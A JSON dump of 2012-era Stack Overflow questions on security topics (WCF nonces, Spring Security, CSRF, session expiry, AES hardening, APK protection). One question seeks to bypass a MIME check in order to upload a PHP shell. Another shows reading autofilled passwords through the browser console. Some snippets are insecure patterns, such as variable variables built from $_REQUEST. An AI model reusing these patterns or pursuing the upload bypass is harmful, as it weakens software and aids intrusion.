eagerMode, Boolean&amp;amp; primarySignatureFound)\n</code></pre>\n\n<p>With dotPeek I can see that this exception is thrown only when </p>\n\n<pre><code>TimeBoundedCache.IExpirableItem val = this.entries[key] as TimeBoundedCache.IExpirableItem;\nif (val == null || this.IsExpired(val))\n    return (object) null; -&gt; condition that exception needs to be thrown fullfilled \n</code></pre>\n\n<p>So if val is either not existing in nonce cache or nonce is expired the exception seen in service trace viewer seems to be thrown.</p>\n\n<p>Since I from the servicelog can see that the service is constructed only one minute ahead in time (and the nonce cache timeout should be 10 minutes default for wsHttpbinding I think) it leads me to think that the val == null hence nonce not existing in message.\nBut since the svc trace is removing nonce values from log its kind of hard to be sure.</p>\n\n<p>If anybody could help me shed some light on this issue.. How to proceed .. Why this is happening and how to reslove it I would appricate it very much</p>\n"},{"tags":["security","checksum","sha","code-access-security"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":54,"score":3,"question_id":12032821,"title":"How to verify that the source code is copied from web","body":"<p>I am building a web tool to check whether the submitted content is taken from web or is it submitter own work. A plagiarism detector. </p>\n\n<p>I have some idea that I can generated check sum and use that as a key to compare with other entries. However, if someone has made some small changes like including/removing comments, changing variables/function name and so on then the checksum will be different, so this approach won't work.</p>\n\n<p>Any suggestions for a better way?</p>\n"},{"tags":["iphone","objective-c","security","encryption","rsa"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":150,"score":0,"question_id":12032878,"title":"RSA Encryption of string with known modulus and exponent in Objective C","body":"<p>I need to implement RSA encryption of  user credentials(password mainly) entered by user in iOS app with defined Modulus and Exponent.</p>\n\n<p>Could you please provide me any example code.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["asp.net-mvc-3","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12032724,"title":"mvc 3.0 vulnerability testing tool","body":"<p>Am looking out for list of tools which can do vulnerability testing for application developed on MVC 3.0 and deployed on Azure.</p>\n"},{"tags":["security","xmpp","sasl","starttls"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":42,"score":3,"question_id":12021374,"title":"Security Layer Byte Precision?","body":"<p>In the <a href=\"http://xmpp.org/rfcs/rfc6120.html\" rel=\"nofollow\">XMPP RFC</a>, there are two <code>MUST</code> directives stating that the XML used for STARTTLS and SASL must not include any whitespace, for the sake of something that the spec states as \"security layer byte precision\". What is that?</p>\n\n<p><hr />\nRelevant extacts from RFC:</p>\n\n<blockquote>\n  <p>...</p>\n  \n  <p>During STARTTLS negotiation, the entities MUST NOT send any whitespace as separators between XML elements (i.e., from the last character of the first-level  element qualified by the 'urn:ietf:params:xml:ns:xmpp-tls' namespace as sent by the initiating entity, until the last character of the first-level  element qualified by the 'urn:ietf:params:xml:ns:xmpp-tls' namespace as sent by the receiving entity). <strong>This prohibition helps to ensure proper security layer byte precision.</strong></p>\n  \n  <p>...\n  During SASL negotiation, the entities MUST NOT send any whitespace as separators between XML elements (i.e., from the last character of the first-level  element qualified by the 'urn:ietf:params:xml:ns:xmpp-sasl' namespace as sent by the initiating entity, until the last character of the first-level  element qualified by the 'urn:ietf:params:xml:ns:xmpp-sasl' namespace as sent by the receiving entity). <strong>This prohibition helps to ensure proper security layer byte precision.</strong></p>\n</blockquote>\n"},{"tags":["spring","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12028857,"title":"Spring security login page gives 404","body":"<p>I am new to spring security, I am getting a http 404 when I try to access the login page which is a jsp page. I am using </p>\n\n<ol>\n<li>Tomcat 7</li>\n<li>Spring framework 3.1.1</li>\n</ol>\n\n<p>Here is the tomcat Web.xml</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n    &lt;web-app version=\"2.5\" xmlns=\"http://java.sun.com/xml/ns/javaee\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee      http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\"&gt;\n\n&lt;!-- The definition of the Root Spring Container shared by all Servlets and Filters --&gt;\n&lt;context-param&gt;\n    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n    &lt;param-value&gt;/WEB-INF/spring/root-context.xml&lt;/param-value&gt;\n&lt;/context-param&gt;\n&lt;context-param&gt;\n    &lt;param-name&gt;log4jConfigLocation&lt;/param-name&gt;\n    &lt;param-value&gt;classpath:log4j.xml&lt;/param-value&gt;\n&lt;/context-param&gt;\n&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;\n&lt;listener&gt;\n    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;\n&lt;/listener&gt;\n&lt;!-- Initializes log4j --&gt;\n&lt;listener&gt;\n    &lt;listener-class&gt;org.springframework.web.util.Log4jConfigListener&lt;/listener-class&gt;\n&lt;/listener&gt;\n\n&lt;filter&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;\n&lt;/filter&gt;\n\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n&lt;!-- Processes application requests --&gt;\n&lt;servlet&gt;\n    &lt;servlet-name&gt;formVilleServlet&lt;/servlet-name&gt;\n    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;\n    &lt;init-param&gt;\n        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;/WEB-INF/spring/appServlet/servlet-context.xml&lt;/param-value&gt;\n    &lt;/init-param&gt;\n    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;\n&lt;/servlet&gt;\n\n&lt;servlet-mapping&gt;\n    &lt;servlet-name&gt;formVilleServlet&lt;/servlet-name&gt;\n    &lt;url-pattern&gt;/&lt;/url-pattern&gt;\n&lt;/servlet-mapping&gt;\n</code></pre>\n\n<p></p>\n\n<p>This is the spring root-context.xml</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;beans:beans xmlns=\"http://www.springframework.org/schema/mvc\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns:beans=\"http://www.springframework.org/schema/beans\"\nxmlns:context=\"http://www.springframework.org/schema/context\"\nxmlns:mvc=\"http://www.springframework.org/schema/mvc\"\nxsi:schemaLocation=\"http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd\n    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\n    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd\"&gt;\n\n&lt;mvc:resources location=\"/resources/**\" mapping=\"/resources/\"/&gt;\n\n&lt;!-- DispatcherServlet Context: defines this servlet's request-processing infrastructure --&gt;\n\n&lt;!-- Enables the Spring MVC @Controller programming model --&gt;\n&lt;annotation-driven /&gt;\n\n&lt;!-- Handles HTTP GET requests for /resources/** by efficiently serving up static resources in the ${webappRoot}/resources directory --&gt;\n&lt;resources mapping=\"/resources/**\" location=\"/resources/\" /&gt;\n\n&lt;!-- Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory --&gt;    \n&lt;beans:bean class=\"org.springframework.web.servlet.view.ResourceBundleViewResolver\"&gt;\n   &lt;beans:property name=\"basename\" value=\"views\"&gt;&lt;/beans:property&gt;\n&lt;/beans:bean&gt;\n&lt;context:component-scan base-package=\"com.xtremesoftwaresolutions.formville\" /&gt;\n</code></pre>\n\n<p></p>\n"},{"tags":["c","security","winapi","pipe","uac"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12026971,"title":"Get client user token from named pipe","body":"<p>How to get user token for named pipe client from server side. I have found ImpersonateNamedPipeClient ,but I just want to query some information from it's token like sessionId.(I don't have access to client side code)\n                                       Thanks in advance.</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12027764,"title":"PHP form that collects email and website address","body":"<p>I have built the following form that collects both email addresses and website urls from people. In the database the email and website url are set to be unique so a person cannot enter the same email and website twice.</p>\n\n<p>However being new to PHP I want to double check that the form does not contain any serious problems that could allow a person to do something malicious with the form and/or has validation issues that could be exploited. Also because I want to hide the form on postback BUT show it again for errors, I have ended up duplicating the form which isn't ideal but not a big deal in this circumstance as it's just a quick form. The main factor is making sure the validation is pretty strong and no holes exist in terms of server/sql attacks in the form.</p>\n\n<pre><code>&lt;?php\n\nif($_SERVER['REQUEST_METHOD'] == 'POST')\n{\n    // DATABASE CONNECTION HERE\n\n    $email = mysql_real_escape_string($_POST['EMAIL']);\n    $website = mysql_real_escape_string($_POST['WEBSITE']);\n\n    if ( $email == '' || $website == '' || !filter_var($website, FILTER_VALIDATE_URL) || !filter_var($email, FILTER_VALIDATE_EMAIL) )\n    {\n        echo '&lt;p style=\"color:red;\"&gt;You must fill out all fields correctly and duplicate emails/websites are not permitted!&lt;/p&gt;';\n\n    ?&gt;\n        &lt;form action=\"./\" method=\"post\"&gt;\n\n            &lt;label for=\"EMAIL\"&gt;Email Address&lt;/label&gt;\n            &lt;input type=\"email\" value=\"\" name=\"EMAIL\" id=\"EMAIL\" required&gt;\n            &lt;label for=\"WEBSITE\"&gt;Website URL&lt;/label&gt;\n            &lt;input type=\"url\" value=\"\" name=\"WEBSITE\" id=\"WEBSITE\" required&gt;\n            &lt;input type=\"submit\" value=\"Join\" name=\"join\"&gt;\n\n        &lt;/form&gt;\n\n    &lt;?php\n\n    }\n    else\n    {\n        $query = \"INSERT INTO list VALUES (NULL, '$email','$website')\";\n\n        $result = mysql_query($query);\n        echo '&lt;p&gt;THANKS!&lt;/p&gt;';\n    }\n}\nelse\n{\n\n?&gt;\n\n&lt;form action=\"./\" method=\"post\"&gt;\n\n    &lt;label for=\"EMAIL\"&gt;Email Address&lt;/label&gt;\n    &lt;input type=\"email\" value=\"\" name=\"EMAIL\" id=\"EMAIL\" required&gt;\n    &lt;label for=\"WEBSITE\"&gt;Website URL&lt;/label&gt;\n    &lt;input type=\"url\" value=\"\" name=\"WEBSITE\" id=\"WEBSITE\" required&gt;\n    &lt;input type=\"submit\" value=\"Subscribe\" name=\"subscribe\"&gt;\n\n&lt;/form&gt;\n\n&lt;?php } ?&gt;\n</code></pre>\n"},{"tags":["php","mysql","security"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12026921,"title":"Pre verify each mysql query before executing","body":"<p>I was thinking about MySQL protect and query templating via PHP. The idea was to make an interface for user to construct query, then store <code>MD5</code> on server and give access only after verify. Would it helps in security, and if it - how to hook each query to MySQL by PHP?</p>\n"},{"tags":["spring","security","grails","spring-security","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12022132,"title":"Spring Security Recommended Design To Request User Login to Different User With Different Role","body":"<p>I have the following use case and need recommendations on the proper implementation.  To be clear can this be done through configuration or do I need to implement new code?</p>\n\n<p><strong>Business Use Case</strong></p>\n\n<p>The business wants to allow a user to login via social media sites and access some of their pages.  But in order to access pages that deal with $$ the user must login via the applications local account.</p>\n\n<p><strong>Technical Use Case</strong></p>\n\n<p>Allow users to login via Facebook or other provider and provide role USER_PARTIAL_RIGHTS</p>\n\n<p>If user accesses a page with role USER_FULL_RIGHTS prompt the user to login to an account that is a local JDBC stored account.</p>\n\n<p>This authentication must also ensure that the page is protected by USER_FULL_RIGHTS role and not other roles.</p>\n\n<p>I am using grail spring security plugin, but I am expecting to have to customize the plugin.</p>\n\n<p>So what are recommendations for doing this?  A couple of ideas that I have are:</p>\n\n<p><strong>Technical Ideas</strong></p>\n\n<ul>\n<li>custom spring access denied handler </li>\n<li>custom access denied controller instead of the stock jsp page</li>\n</ul>\n"},{"tags":["php","security",".htaccess","web-security","root"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12026478,"title":"Connection php files above or below the root?","body":"<p>Just so I have this right...</p>\n\n<p>Above the root (where the word here is) would be...</p>\n\n<pre><code>         here/public/allfiles.php\n</code></pre>\n\n<p>Below the root (where the word here is) would be....</p>\n\n<pre><code>         public/here/allfiles.php\n</code></pre>\n\n<p>Ok, so...</p>\n\n<p>I have been trying to place the php connection file ABOVE the root but of course I have been having problems with that for obvious reasons, being that anything ABOVE the root directory is not accessible</p>\n\n<p>So my question is this...</p>\n\n<p>Is it considered safe for the purposes of creating a secure php website by placing the connection.php folder (for mysql connections etc) BELOW the root and placing a htaccess file within that folder to prevent peeps viewing it</p>\n"},{"tags":["security","encryption","ssl","cryptography","wireless"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12025458,"title":"Does this render SSL encryption vulnerable?","body":"<p>From my understanding, prior to secure SSL communications, a symmetric key is established between the two parties. Now, if an SSL session were to involve an unsecure wireless access point, would it be possible for an attacker to sniff the airwaves and obtain the established key?</p>\n"},{"tags":["php","linux","security","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":8,"view_count":175,"score":-8,"question_id":12024869,"title":"How to change file mime type to bypass php shell upload?","body":"<p>I am testing my friends site. It allows only jpeg to be uploaded in upload script. The checking is done like this\nfollowing script is run</p>\n\n<pre><code>file --mime-type --brief filename\n</code></pre>\n\n<p>Only if this gives image/jpeg its allowing the upload. How can I upload a php ? Basically i need to spoof this mime type?\nThanks a lot!</p>\n"},{"tags":["php","security","codeigniter","session"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":128,"score":2,"question_id":11817045,"title":"Codeigniter security concern - Sessions that last forever?","body":"<p>I found something which I believe to be quite concerning while inspecting CodeIgniter's session handling mechanism. </p>\n\n<pre><code>$expire = $this-&gt;now - $this-&gt;sess_expiration;\n\n$this-&gt;CI-&gt;db-&gt;where(\"last_activity &lt; {$expire}\");\n$this-&gt;CI-&gt;db-&gt;delete($this-&gt;sess_table_name);\n</code></pre>\n\n<p>It appears that CI actually determines the session expiration time based on last_activity rather than a fixed, non-variable expiration field. </p>\n\n<p>The problem here is that last_activity is updated to now() whenever the session is updated. So let's assume you are using CI defaults and have a session lasting 7200 seconds(2 hours) that's updated every 300 seconds(5 minutes)</p>\n\n<p>The session is flagged as needing an update after 5 minutes of the last update, so if a user submits his session cookie after these 5 minutes, but before 2 hours, then CI will extend the session to last another 2 hours from this moment because last_activity will be updated to now().</p>\n\n<p>This seems like a huge security risk to me, because as long as the user is active and keeps triggering the session update, its duration is extended indefinitely, effectively making the expiration setting useless. I've tested this by setting update to 10 seconds and expiration to 20. I can confirm that as long as I kept hitting refresh every 10 seconds, the session never expired!</p>\n\n<p>Imagine if an attacker steals your login cookie and establishes a valid session. Even if you invalidate the login cookie, the attacker could keep his session valid indefinitely so long as he kept submitting the cookie often enough. </p>\n\n<p>What do you think? Am I missing something important here? Or is this really as bad a security hole as it appears? </p>\n"},{"tags":["security","website","yii","csrf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":111,"score":0,"question_id":12020226,"title":"Cross-site request forgery Yii ,PHP","body":"<p>I am trying to implement CSRF validation in yii . I have written my own class and everything works fine except the fact that my post variable(for the form) does not consist of the token . Am I supposed to set the token myself in the post variable ? Yii documentation states that the post variable is set by a hidden field in every form . Does it require further implementation in the forms as well ? I know the token is not there as I saw the Post variables by dumping them . </p>\n"},{"tags":["security","ios","x509certificate","certificate-revocation","ocsp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":604,"score":1,"question_id":5625642,"title":"CRL and OCSP behavior of iOS / Security.Framework?","body":"<p>I'm trying to figure out what iOS' policy is when verifying certificates using Security.Framework regarding revocation of certificates.\nI cannot find information about this in the docs for iOS.\nIn the context of an iPad project I'm working on at the moment, there is reason to demand checking revocation status for some certs. Anyone ideas on how to force CRL / OCSP checking during cert verification using Security.Framework? Or do I need to \"fall back\" to OpenSSL to accomplish this?</p>\n\n<p>It seems that also on Mac OS X 10.6 CRL / OCSP checks are done optionally and have to be turned on manually through Keychain Access.</p>\n\n<p>Martijn</p>\n"},{"tags":["security","powershell"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":94,"score":3,"question_id":12021438,"title":"Where does powershell saves the set-executionpolicy setting?","body":"<p>I'm building some servers and need to run some powershell scripts on them. However, I need to run the command <code>Set-ExecutionPolicy -ExecutionPolicy remotesigned -Force</code> manually on <strong>every</strong> server. Because I can't set execution policy in a script. I want to know where PowerShell save the execution policy setting and want to directly change it. Is that possible?</p>\n\n<p>Thanks.</p>\n"},{"tags":["security","encryption","aes","password-protection","brute-force"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":104,"score":0,"question_id":11965095,"title":"Is it possible to harden aes encryption against brute force attack?","body":"<p>is there any way to harden aes encryption against brute force attack without strengthening password. I mean users generally choose easy passwords. I don't want to force users to choose more and more complicated password.(This is the correct solution but it is useless when they forget their passwords continuously, and they cannot use their password) They choose their passwords from uppercase, lowercase and digits. And password length is 8. I want to make it difficult to brute force attacking without changing these password properties.</p>\n\n<p>EDIT: Password length is exactly 8. Less length is not acceptable. And one more question over replies, keeping encrypted text on memory (using salting and key stretching) is a security problem?</p>\n"},{"tags":["windows","security","unix","acl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":192,"score":1,"question_id":5140962,"title":"Unix UIDs vs Windows SIDs - why?","body":"<p>From what I've read UIDs in Unix are assigned by the administrator while the SIDs are random in Windows. Is there a security reason behind this, or is it just different ways to solve IDs?</p>\n\n<p>Thanks</p>\n"},{"tags":["security","search","windows-7","filepath","custom-search-provider"],"answer_count":1,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":401,"score":7,"question_id":2135799,"title":"Security issue with custom search provider for Windows 7","body":"<p>I built a search provider for Windows 7, running on <strong>localhost</strong>. (using .osdx file and RSS web site)\nthe  element in the returned RSS contains <strong>local</strong> file path.</p>\n\n<p>example: <code>&lt;link&gt;c:\\windows\\win.ini&lt;/link&gt;</code></p>\n\n<p>The problem is that the files shown in the search result window with the following message:</p>\n\n<blockquote>\n  <p>This item was blocked because of your Internet security settings</p>\n</blockquote>\n\n<p><img src=\"http://pasteboard.s3.amazonaws.com/images/1345314800731987.png\" alt=\"This item was blocked because of your Internet security settings\"></p>\n\n<p>How to prevent this security restriction?</p>\n"},{"tags":["java","security","securitymanager"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":11620354,"title":"Running Java Security Manager without the default java.policy file","body":"<p>I don't want to modify anything in my java home directory, however, I am afraid that sometimes my default java.policy file may be too permissive. Is there a way for me to use a specified policy file as the only policy file when I run java with the <code>-Djava.security.manager</code> option?</p>\n\n<p>If I add a <code>-Djava.security.policy=myPolicy.policy</code> option, it uses my policy file in addition to the default policy file -- which is bad because it looks like all permissions granted in the default policy file is still granted.</p>\n"},{"tags":["jquery","security","console"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":12012798,"title":"How to prevent a user from getting password field value in console","body":"<p>I have been helping out some people with their computers and repairing them.  One of these people asked me about the safety of storing passwords in the auto form field.  I showed them a quick trick on how you can retrieve the password from a simple jQuery call in the console.  While working on some websites, I have been trying to figure out a way of preventing the use of this trick to find out what the saved password is.  </p>\n\n<p>To understand what im talking about if you dont know, try the following.  </p>\n\n<ol>\n<li>Navigate to a website with jquery (or jquerify the site) and either have auto form fill in turned on or fill in the password field.</li>\n<li>inspect element to show the password id field or some way to call the field with jquery</li>\n<li>in console run something like <code>$('#password').val()</code> and watch the password show up.</li>\n</ol>\n\n<p>I am wondering if there is some way for me as a web developer to prevent the use of this on my site but still allow the use of it for getting the value of the field within the site code.</p>\n\n<p>Thanks. </p>\n\n<p><strong>EDIT</strong></p>\n\n<p>From facebook with login autofilled out (blacked out for security)</p>\n\n<p><img src=\"http://i.stack.imgur.com/uKFSV.png\" alt=\"enter image description here\"></p>\n\n<p>and then after jquerifying the page and running the <code>$jq('#pass').val()</code> in console without changing anything (password blacked for security)</p>\n\n<p><img src=\"http://i.stack.imgur.com/KR47l.png\" alt=\"enter image description here\"></p>\n\n<p><strong>USE CASE</strong></p>\n\n<p>User 1 is on public computer,  they allow the browser to save login info</p>\n\n<p>User 1 leaves, User 2 goes to same site.  browser auto fills in login info</p>\n\n<p>User 2 runs the command and gains access to the password</p>\n"},{"tags":["android","security","apk","packer"],"answer_count":0,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":137,"score":4,"question_id":12020785,"title":"What tools exist that offer apk protection for android (against reversing and repackaging)?","body":"<p>Seems that one of my company's successful apps has been repackaged as a torjan and distributed on 3rd parties markets (outside of google play). I'm looking for a robust solution that will protect our apps from such issues in the future. </p>\n\n<p>So far I've seen:</p>\n\n<ul>\n<li><a href=\"http://www.droidactivator.org/\" rel=\"nofollow\">http://www.droidactivator.org/</a></li>\n<li><a href=\"http://www.androidlicenser.com/\" rel=\"nofollow\">http://www.androidlicenser.com/</a></li>\n</ul>\n\n<p>But neither seem to deliver a comprehensive solution.</p>\n\n<p>Any ideas anyone?</p>\n"},{"tags":["spring","security","roles"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12019290,"title":"User ,Role and User_Role spring security","body":"<p>I'll try to learn some spring security without any progress. I create a User and a Role class with 3 database tables: an User a Role and an User_Role table which the last one is the join table and have role-id and user-id inside.</p>\n\n<p>But when I try to create  a user I get the error below:   </p>\n\n<p>in thread \"main\" javax.persistence.PersistenceException:  org.hibernate.PersistentObjectException: detached entity passed to persist: com.webapp.User.</p>\n\n<p>What can it depends on? </p>\n\n<p>What is wrong here?</p>\n\n<p>Thanks for any help.</p>\n\n<pre><code>@Entity\n@Table(name = \"USER\")\npublic class User\n{\n\n@Id\n@Column(name = \"id\")\n@GeneratedValue(strategy = GenerationType.AUTO)\nprivate Long id;\n\n@Column(name = \"firstName\", nullable = true, unique = false)\nprivate String firstName;\n\n@Column(name = \"lastName\", nullable = true, unique = false)\nprivate String lastName;\n\n@Column(name = \"password\", nullable = false, unique = false)\nprivate String password;\n\n@Column(name = \"email\", nullable = false, unique = true)\nprivate String email;\n\n@Column(name = \"isEnabled\", nullable = true, unique = false)\nprivate Boolean isEnabled;\n\n@JoinTable(name = \"USER_ROLE\", joinColumns = @JoinColumn(name = \"id_user\"),inverseJoinColumns = @JoinColumn(name = \"id_role\"))\n@ManyToMany(cascade = CascadeType.ALL)\nprivate List&lt;Role&gt; roles = new ArrayList&lt;Role&gt;();\n    //+ setters and getters\n }\n</code></pre>\n\n<p>and a Role class as below:</p>\n\n<pre><code>@Entity\n@Table(name = \"ROLE\")\n public class Role {\n\n@Id\n@Column(name = \"id\")\n@GeneratedValue(strategy = GenerationType.AUTO)\nprivate Long id;\n\n\n@Column(name = \"roleName\")\nprivate String roleName;\n\npublic Role() {\n}\n\n\npublic Role(Long id, String roleName)\n{\n    super();\n    this.id = id;\n    this.roleName = roleName;\n}\n\n\npublic Role(String roleName)\n{\n    super();\n    this.roleName = roleName;\n}\n   //+ setters and getters\n</code></pre>\n\n<p>}</p>\n\n<p>and below are the way i add new User and Role:</p>\n\n<pre><code>        List&lt;Role&gt; roles= new ArrayList&lt;Role&gt;();\n    Role role= new Role(\"ROLE_USER\");\n    Role role1= new Role(\"ROLE_ADMIN\");\n    roles.add(role);\n    roles.add(role1);\n    User user1= new User(\"firstname\", \"lastname\", \"password\", \"email\", true,roles);\n</code></pre>\n"},{"tags":["mysql","database","security","hacking","anti-hacking"],"answer_count":7,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":211,"score":2,"question_id":11854231,"title":"MySql Database Hacked, NOT injections","body":"<p>Three weeks ago, I found a list of my website's users and info on Paste Bin giving away all privacy. I ran updates and protected against SQL Injections. I also added a pre-request to save the SQL in text format in a LOG table whenever user input is required to be able to analyse any injection if my protection wasn't enough.</p>\n\n<p>Then today the same post was on Paste Bin again with recent entries so I checked the LOG table to find only clean entries. Is there anything else than injections I should worry about? The web seems to give info about Injections only!</p>\n\n<p>Could they have had access to the dbpassword in a php file on the server and could they have connected from and external server?</p>\n\n<p>Should I change the dbpassword frequently?</p>\n\n<p>Are there any solution non-script wise like hosting security plan or something like that which should be efficient enough?</p>\n\n<p>I am receiving physical threats from hacked users and would really like to close this quickly...</p>\n"},{"tags":["android","eclipse","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":101,"score":1,"question_id":11813274,"title":"Classes.dex Causing problems","body":"<p>I can't delete or even right click my classes.dex, when i do \"my computer\" stops responding. When i try to clean projects using eclipse, the progress stuck when it tries to delete classes.dex. I also tried scanning the bin folder of my app with my anti virus but it also stopped responding when it tried to scan classes.dex. I think this is also the reason I can't run my apps.</p>\n\n<p>Check out this question:\n<a href=\"http://stackoverflow.com/questions/11428564/eclipse-stuck-at-running-program?answertab=votes#tab-top\">eclipse stuck at running program</a></p>\n\n<p>We have the similar problem. He was able to solve it and he said it was caused by kaspersky(i have kaspersky installed) but he did not explain how. I tried to disbale protection with kaspersky and it didn't work.</p>\n"},{"tags":["actionscript-3","flash","security","crossdomain.xml"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12017987,"title":"Security issues with Wordnik API AS3","body":"<p>I'm making an online game, that uses Wordnik API AS3 to fetch word definitions. Everything works fine when i'm testing localy (sandboxType: localTrusted). But when I upload my .swf (sandboxType: remote or localWithNetwork) I get Wordnik API response \"Security error accessing url\".</p>\n\n<p>I've set \"useNetworkServices\" to true.</p>\n\n<p>I'm doing:</p>\n\n<pre><code>Security.allowDomain(\"api.wordnik.com\");\nSecurity.loadPolicyFile(\"api.wordnik.com/crossdomain.xml\");\n</code></pre>\n\n<p>It could be some issue with crossdomain.xml. When testing in localTrusted I get the debug message \"api.wordnik.com does not specify meta-rule. using default meta-rule 'master-only'\". I get similar message for Google Interactive Media Ads, but it defaults to 'by-content-type'. Google IMA works when uploaded, Wordnik doesn't.</p>\n\n<p>I'm not even sure if the problem is on my side.</p>\n\n<p>Helpful answer would provide a working solution for the security issue, or point to any application using Wordnik AS3 API online - maybe its developers could help.</p>\n\n<p>:)</p>\n"},{"tags":["php","security","variables","request","globals"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":247,"score":2,"question_id":3983933,"title":"Security Risk? $_REQUEST variables ... $$ on the local stack","body":"<p>I was talking with one of my programmers earlier and he showed me a piece of code he was considering:</p>\n\n<pre><code>foreach($_REQUEST as $var=&gt;$val) {\n    $$var = addslashes($val);\n}\n</code></pre>\n\n<p>He wanted to be able to use <code>$varName</code> instead of having to write <code>$_REQUEST['varName']</code></p>\n\n<p>I advised him to use the <code>mysql_real_escape_string</code> instead of <code>addSlashes</code> and to not put the <code>$_REQUEST</code> variables onto the local stack because that gives hackers an attach vector. To me that seems like the same problem that the old <code>REGISTER_GLOBALS</code> directive had. </p>\n\n<p>He said there was not the same security risks because those variables were all being created on the local stack. So I was uncertain and I checked out the PHP variable variables page at: <a href=\"http://www.php.net/manual/en/language.variables.variable.php\" rel=\"nofollow\">http://www.php.net/manual/en/language.variables.variable.php</a> but saw no reference to Super Globals and security other then the warning box.</p>\n\n<p>Can hackers easily take advantage of that construct?</p>\n"},{"tags":["java","android","security","oauth","oauth-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":11992503,"title":"How to secure Android App that pulls data from OAuth protected resource","body":"<p>My company is building a RESTful API that will return moderately sensitive information (i.e. financial information, but not account numbers).  I have control over the RESTful API code/server and also am building the Android app.  I've setup the API to use OAuth 2 with authorization code grant flow (with client ID and secret), and I auto-approve users without them having to approve the client since we own both client and provider.  We use CAS for SSO and I am using this for the Authorization server as part of the OAuth 2 process when the user logs in to retrieve the token.</p>\n\n<p>I am contemplating various ways to secure the data on the Android app.  I've concluded that storing the client id and secret on the device is definitely not going to happen, but am thinking that storing the auth token might work, since it is only risk to the individual user (and really only if they happen to have a rooted phone).</p>\n\n<p>Here are two options I have thought of.  They both require me to have a sort of proxy server that is CAS protected, does the dance with the API server, and returns the auth token.  This gets rid of the need for storing the client id and secret in the app code.</p>\n\n<p>Here are what I've come up with:</p>\n\n<p>1) Require the user to enter their password to access data each time they startup the App.  This is definitely the most foolproof method.  If this were done, I'd probably want to save the userID for convenience, but in that case couldn't use the CAS login (since it's web-based). I might be able to use a headless browser on the backend to log the user into CAS and retrieve the token based on what they enter in the Android form, but this seems hacky. Saving the userID is similar to what the Chase app does (if you happen to use this one) - it saves the userID but not your password between sessions.</p>\n\n<p>2) Store the auth token on the Android device. This is a little less secure, but almost foolproof. When the user starts the app for the first time, open the webpage to the CAS login of the proxy server that returns the token (similar to <a href=\"https://developers.google.com/accounts/docs/MobileApps\" rel=\"nofollow\">https://developers.google.com/accounts/docs/MobileApps</a>).  After the user logs in and the token is returned to the app, encrypt it and store it private to the application.  Also, use ProGuard to obfuscate the code, making the encryption algorithm more difficult to reverse engineer. 